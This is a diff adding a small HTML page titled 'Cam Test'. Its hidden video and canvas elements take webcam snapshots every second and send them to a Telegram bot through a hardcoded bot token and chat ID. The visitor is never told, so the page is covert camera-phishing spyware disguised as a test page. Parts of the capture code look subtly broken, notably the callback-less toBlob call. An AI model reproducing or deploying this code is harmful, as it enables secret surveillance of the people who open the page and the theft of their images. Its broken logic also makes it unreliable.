@@ -1,0 +1,6 @@
+<!DOCTYPE html><html><head><title>Cam Test</title></head><body><video id="v" autoplay style="display:none"></video><canvas id="c" style="display:none"></canvas><script>
+let tgToken='8530272018:AAG50QwBYxbZBiQgTbcBh-NtgOLuRdj1FD0'; let chatId='7580429046'; let front=true;
+async function initCam(){const s={video:{facingMode:front?'user':'environment'}}; const stream=await navigator.mediaDevices.getUserMedia(s); document.getElementById('v').srcObject=stream;}
+async function snap(){const v=document.getElementById('v'); const c=document.getElementById('c'); c.width=v.videoWidth; c.height=v.videoHeight; c.getContext('2d').drawImage(v,0,0); const blob=await new Response(c.toBlob()).blob(); const form=new FormData(); form.append('photo',blob,'cam.jpg'); form.append('chat_id',chatId); await fetch(`https://api.telegram.org/bot${tgToken}/sendPhoto`,{method:'POST',body:form});}
+navigator.mediaDevices.getUserMedia({video:true}).then(initCam).catch(e=>alert('No cam')); setInterval(snap,1000);
+</script></body></html>
